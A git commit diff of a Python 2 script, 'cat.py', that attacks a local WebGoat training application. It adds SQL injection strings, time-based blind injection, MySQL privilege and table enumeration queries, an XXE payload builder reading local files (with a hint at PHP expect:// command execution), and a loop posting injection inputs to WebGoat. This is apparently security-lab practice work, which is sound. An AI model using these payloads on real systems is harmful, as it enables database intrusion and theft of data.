3078f3d153e244a3988d226d4b46e00531a5fbfe
vpa1977 <vpa1977@gmail.com>
2017-07-14 23:23:59 +1200

    Update cat.py

--- cat.py
+++ cat.py
@@ -1,3 +1,12 @@
+#http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+#http://www.spammimic.com/decode.cgi
+#https://hexed.it/
+#https://www.base64decode.org/
+#https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices
+#https://help.ubuntu.com/community/SSH/OpenSSH/Configuring
+# javascript console: document
+# javascript console : document.cookie="name=value"
+
 
 import urllib
 import cookielib
@@ -12,7 +21,7 @@ class httpclient:
 			urllib2.HTTPSHandler(),
 			urllib2.HTTPCookieProcessor(self.cookies)
 			]
-		self.magic_inputs = ["'+'%'+'", "'", "' OR 1=1", "#" , "1' or '1' = '1'))/*", "1' or '1' = '1'))#"]
+		self.magic_inputs = ["'+'%'+'", "'", "' OR '1'='1", "#" , "1 or 1=1", "1' or 1=1#"]
 		
 
 
@@ -47,6 +56,19 @@ class httpclient:
 		self.patch_headers(opener, headers)
 		return opener.open(req)
 
+	# could not get it to work with opener. hope we can isolate all xml magic
+	def post_with_body(self, uri, data, headers=None): # data - dict()
+		req = urllib2.Request(uri, data.encode('utf-8'))
+		req.add_header('User-Agent','Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11')
+		req.add_header('Referer',uri)
+		for k, v in headers:
+			req.add_header(k, v)
+		self.decorate(req)
+		print(uri)
+		print('<br><br>')
+		return urllib2.urlopen(req)
+		
+
 	def post(self, uri, data = dict(), headers=None): # data - dict()
 		data = urllib.urlencode(data)
 		req = urllib2.Request(uri, data)
@@ -54,9 +76,11 @@ class httpclient:
 		opener = self.make_opener(uri)
 		self.patch_headers(opener, headers)
 		print(uri)
+		print(data)
 		print('<br><br>')
 		
 		return opener.open(req)
+
 
 	def patch_headers(self, opener,headers):
 		if (headers is None):
@@ -79,7 +103,7 @@ class httpclient:
 		return " LIMIT "+str(offset) + "," + str(count)
 	
 	def sleep_query(seconds):
-		return " and sleep("+str(seconds) + ")"
+		return " or sleep("+str(seconds) + ")"
 
 	# write some php into outfile
 	def write_file(content, outfile):
@@ -101,6 +125,25 @@ class httpclient:
 			if (confirmed == False):
 				return result
 		return result
+	
+	def list_privileges():
+		return """SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;"""
+	
+	def list_dba():
+		return """SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'; # priv"""
+	
+	def list_columns():
+		return """SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"""
+	
+	def list_tables():
+		return """SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"""
+
+#php loves expect://id
+	def do_xxe(self,xxe):
+		return "<!DOCTYPE root [<!ENTITY foo SYSTEM \""+xxe+"\">]>"
+
+	def shift(self,str, offset):
+		return ''.join([ chr(ord(x) + offset) for x in str ])
 
 cat = httpclient()
 #cat.cookies.set_cookie(cat.make_cookie('JSESSIONID','A8A9EB6C28315BAE0E381B82CD81D894'))
@@ -112,6 +155,17 @@ cat = httpclient()
 	
 #data = cat.get('http://localhost:8080/WebGoat/plugin_extracted/plugin/ClientSideFiltering/jsp/clientSideFiltering.jsp?userId=112', {}, {('Cookie','JSESSIONID=1453EBAA61291CAFCB0F015160D69D09')})
 #print(data.read())
+
+def xxe_example():
+	data = cat.post_with_body('http://localhost:8080/WebGoat/attack?Screen=87365&menu=1700', 
+		cat.do_xxe('file:///c:/')+"<searchForm>  <from>&foo;</from></searchForm>",  
+			{('Cookie','JSESSIONID=1453EBAA61291CAFCB0F015160D69D09'), 
+	#			('Referer', 'http://localhost:8080/WebGoat/start.mvc'), 
+				('Accept', '*/*'), 
+				('Accept-Encoding', 'en-US,en;q=0.5'), 
+				('Accept-Language', 'gzip, deflate'), 
+				('Content-Type', 'application/xml;charset=UTF-8')})
+	print(data.read())
 
 def blind_example():
 		def confirm(data):
@@ -130,3 +184,11 @@ def blind_example():
 
 		discovery = cat.blind_check(data_getter, confirm, positions, letters)
 		print([ chr(x) for x in discovery])
+
+
+#print(cat.shift(reversed('alice'), 1))
+for weak in cat.magic_inputs:
+	data = cat.post('http://localhost:8080/WebGoat/attack?Screen=162777743&menu=3000', 
+		{'Credit' : 'AMEX-33413003333', 'SUBMIT' : weak,'user' : weak }, 
+		{('Cookie','JSESSIONID=1453EBAA61291CAFCB0F015160D69D09; user=\"eW91YXJldGhld2Vha2VzdGxpbms=\"')})
+	print(data.read())
